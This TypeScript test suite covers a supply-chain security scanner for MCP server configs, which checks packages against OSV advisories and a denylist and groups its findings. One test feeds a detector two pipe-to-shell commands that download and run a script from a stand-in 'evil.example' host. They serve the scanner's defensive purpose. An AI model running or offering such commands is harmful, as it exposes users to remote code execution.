import * as assert from "assert";
import * as fs from "fs";
import * as os from "os";
import * as path from "path";
import { analyzeItems, looksLikePipeToShell, packagesFromItems } from "../scanners/itemAnalyzer";
import { inventoryWorkspaceRoot } from "../scanners/inventory";
import { analyzePackages } from "../scanners/packageAnalyzer";
import { groupMcpFindings } from "../ui/findingGroups";
import { actionableCoverageGapCount, buildPosture, EMPTY_INVENTORY_SUMMARY } from "../ui/postureModel";
import type { Finding } from "../types";

function fakeRegistryAndOsv(opts: {
  latest?: string;
  osvIds?: string[];
  osvOk?: boolean;
  onOsvBody?: (body: string) => void;
}): typeof fetch {
  return async (url, init) => {
    const href = String(url);
    const method = String(init?.method || "GET").toUpperCase();
    if (method === "POST") {
      opts.onOsvBody?.(String(init?.body || ""));
      if (opts.osvOk === false) {
        throw new Error("osv down");
      }
      const ids = opts.osvIds || [];
      return {
        ok: true,
        json: async () => ({ results: [{ vulns: ids.map((id) => ({ id })) }] }),
      } as Response;
    }
    if (href.includes("registry.npmjs.org") || href.includes("pypi.org")) {
      if (!opts.latest) {
        return { ok: false, json: async () => ({}) } as Response;
      }
      return {
        ok: true,
        json: async () => (href.includes("pypi.org") ? { info: { version: opts.latest } } : { version: opts.latest }),
      } as Response;
    }
    return {
      ok: true,
      json: async () => ({ summary: opts.osvIds?.[0] ? `advisory ${opts.osvIds[0]}` : "ok" }),
    } as Response;
  };
}

suite("MCP unpinned latest", () => {
  test("unpinned MCP whose latest is MAL-* lands in malicious, not unpinned", async () => {
    const findings = await analyzePackages(
      [
        {
          ecosystem: "npm",
          name: "evil-mcp",
          version: "unknown",
          path: "/repo/.cursor/mcp.json",
          surface: "mcp",
          mcpId: "evil",
        },
      ],
      "baseline",
      fakeRegistryAndOsv({ latest: "9.9.9", osvIds: ["MAL-2024-9999"] }),
    );
    const grouped = groupMcpFindings(findings);
    assert.deepStrictEqual(
      grouped.malicious.map((f) => f.packageName),
      ["evil-mcp"],
    );
    assert.deepStrictEqual(grouped.unpinned, []);
    const hit = grouped.malicious[0];
    assert.strictEqual(hit.version, "9.9.9");
    assert.strictEqual(hit.resolvedVersion, "9.9.9");
    assert.strictEqual(hit.unverifiedOnline, undefined);
    assert.strictEqual(hit.malicious, true);
    assert.match(hit.message, /latest on npm is 9\.9\.9 and that version is malicious/);
    assert.ok(!hit.message.includes("@latest"));
  });

  test("failed latest lookup stays unpinned and unverified", async () => {
    const findings = await analyzePackages(
      [
        {
          ecosystem: "npm",
          name: "chrome-devtools-mcp",
          version: "unknown",
          path: "/repo/.cursor/mcp.json",
          surface: "mcp",
          mcpId: "docs",
        },
      ],
      "baseline",
      fakeRegistryAndOsv({}),
    );
    const grouped = groupMcpFindings(findings);
    assert.strictEqual(grouped.malicious.length, 0);
    assert.strictEqual(grouped.vulnerable.length, 0);
    assert.strictEqual(grouped.unpinned.length, 1);
    assert.strictEqual(grouped.unpinned[0].unverifiedOnline, true);
    assert.strictEqual(grouped.unpinned[0].version, "unknown");
    assert.match(grouped.unpinned[0].message, /could not be resolved/);
  });

  test("@latest token queries OSV with the resolved version, not the string latest", async () => {
    let posted = "";
    const findings = await analyzePackages(
      [
        {
          ecosystem: "npm",
          name: "chrome-devtools-mcp",
          version: "unknown",
          spec: "latest",
          pinExact: false,
          path: "/repo/.cursor/mcp.json",
          surface: "mcp",
          mcpId: "docs",
        },
      ],
      "baseline",
      fakeRegistryAndOsv({
        latest: "0.4.1",
        osvIds: [],
        onOsvBody: (body) => {
          posted = body;
        },
      }),
    );
    const body = JSON.parse(posted) as { queries: Array<{ version: string }> };
    assert.strictEqual(body.queries[0].version, "0.4.1");
    assert.ok(!posted.includes('"latest"'));
    const grouped = groupMcpFindings(findings);
    assert.strictEqual(grouped.unpinned.length, 1);
    assert.strictEqual(grouped.unpinned[0].version, "unknown");
    assert.strictEqual(grouped.unpinned[0].resolvedVersion, "0.4.1");
    assert.strictEqual(grouped.unpinned[0].unverifiedOnline, false);
    assert.match(grouped.unpinned[0].message, /latest on npm is 0\.4\.1/);
  });

  test("latest CVE-only goes to Vulnerable MCP", async () => {
    const findings = await analyzePackages(
      [
        {
          ecosystem: "npm",
          name: "lodash",
          version: "unknown",
          path: "/repo/.cursor/mcp.json",
          surface: "mcp",
          mcpId: "lodash",
        },
      ],
      "baseline",
      fakeRegistryAndOsv({ latest: "4.17.20", osvIds: ["GHSA-xxxx-yyyy-zzzz"] }),
    );
    const grouped = groupMcpFindings(findings);
    assert.strictEqual(grouped.vulnerable.length, 1);
    assert.strictEqual(grouped.malicious.length, 0);
    assert.strictEqual(grouped.unpinned.length, 0);
    assert.strictEqual(grouped.vulnerable[0].version, "4.17.20");
    assert.match(grouped.vulnerable[0].message, /latest on npm is 4\.17\.20 and that version is vulnerable/);
  });

  test("denylist hit on latest is malicious and not unverified", async () => {
    const findings = await analyzePackages(
      [
        {
          ecosystem: "npm",
          name: "nx",
          version: "unknown",
          path: "/repo/.cursor/mcp.json",
          surface: "mcp",
          mcpId: "nx",
        },
      ],
      "baseline",
      fakeRegistryAndOsv({ latest: "20.9.0" }),
    );
    const grouped = groupMcpFindings(findings);
    assert.strictEqual(grouped.malicious.length, 1);
    assert.strictEqual(grouped.unpinned.length, 0);
    assert.notStrictEqual(grouped.malicious[0].unverifiedOnline, true);
    assert.strictEqual(grouped.malicious[0].version, "20.9.0");
  });

  test("OSV down after latest resolve stays unpinned, not safe", async () => {
    const findings = await analyzePackages(
      [
        {
          ecosystem: "npm",
          name: "chrome-devtools-mcp",
          version: "unknown",
          path: "/repo/.cursor/mcp.json",
          surface: "mcp",
          mcpId: "docs",
        },
      ],
      "baseline",
      fakeRegistryAndOsv({ latest: "0.4.1", osvOk: false }),
    );
    const grouped = groupMcpFindings(findings);
    assert.strictEqual(grouped.unpinned.length, 1);
    assert.strictEqual(grouped.unpinned[0].unverifiedOnline, true);
    assert.match(grouped.unpinned[0].message, /OSV was unreachable/);
  });
});

suite("unchecked MCP servers", () => {
  test("url and docker inventory rows emit Unchecked findings", async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "mcp-unchecked-"));
    fs.mkdirSync(path.join(root, ".cursor"), { recursive: true });
    fs.writeFileSync(
      path.join(root, ".cursor", "mcp.json"),
      JSON.stringify({
        mcpServers: {
          remote: { url: "https://example.invalid/mcp" },
          box: { command: "docker", args: ["run", "-i", "--rm", "example.invalid/mcp-never-start"] },
          docs: { command: "npx", args: ["-y", "chrome-devtools-mcp"] },
        },
      }),
      "utf8",
    );
    const items = inventoryWorkspaceRoot(root);
    const remote = items.find((i) => i.mcpId === "remote");
    const box = items.find((i) => i.mcpId === "box");
    assert.ok(remote && !remote.packageName);
    assert.strictEqual(remote!.mcpUrl, "https://example.invalid/mcp");
    assert.ok(box && !box.packageName);
    assert.match(box!.mcpCommand || "", /docker run/);
    const pkgs = packagesFromItems(items);
    assert.ok(pkgs.some((p) => p.name === "chrome-devtools-mcp" && p.surface === "mcp"));
    assert.ok(!pkgs.some((p) => p.name === "remote" || p.path.includes("example.invalid")));

    const findings = await analyzeItems(items, "baseline", fakeRegistryAndOsv({}));
    const grouped = groupMcpFindings(findings);
    assert.deepStrictEqual(
      grouped.unchecked.map((f) => f.mcpId).sort(),
      ["box", "remote"],
    );
    assert.ok(grouped.unchecked.some((f) => f.message.includes("URL: https://example.invalid/mcp")));
    assert.ok(grouped.unchecked.some((f) => f.message.includes("Command: docker")));
    assert.ok(!grouped.unchecked.some((f) => f.packageName));
  });

  test("pipe-to-shell hygiene is medium, not registry malware", () => {
    assert.strictEqual(looksLikePipeToShell("curl https://evil.example/x | sh"), true);
    assert.strictEqual(looksLikePipeToShell("wget -qO- https://evil.example/x | bash"), true);
    assert.strictEqual(looksLikePipeToShell("npx -y chrome-devtools-mcp"), false);
  });

  test("posture coverage row focuses MCP view", () => {
    const unchecked: Finding = {
      id: "u",
      source: "baseline",
      surface: "mcp",
      severity: "info",
      title: "Unchecked MCP server remote",
      message: "URL: https://example.invalid/mcp",
      path: "/repo/.cursor/mcp.json",
      mcpId: "remote",
      mcpUrl: "https://example.invalid/mcp",
      acknowledged: false,
      createdAt: "2026-09-05T00:00:00.000Z",
      coverageNote: true,
      coverageKind: "unchecked-mcp",
    };
    const model = buildPosture([unchecked], { ...EMPTY_INVENTORY_SUMMARY, hasOpenFolder: true, mcpServers: 1 });
    const row = model.groups.find((g) => g.kind === "coverage")?.rows.find((r) => r.id === "uncheckedMcp");
    assert.ok(row);
    assert.match(row!.label, /MCP servers not packages \(1\)/);
    assert.strictEqual(row!.command?.command, "chaintrap.mcp.focus");
    assert.ok(!model.groups.find((g) => g.kind === "coverage")?.rows.some((r) => r.id === "noLockfile"));
    assert.strictEqual(actionableCoverageGapCount([unchecked]), 1);
  });
});
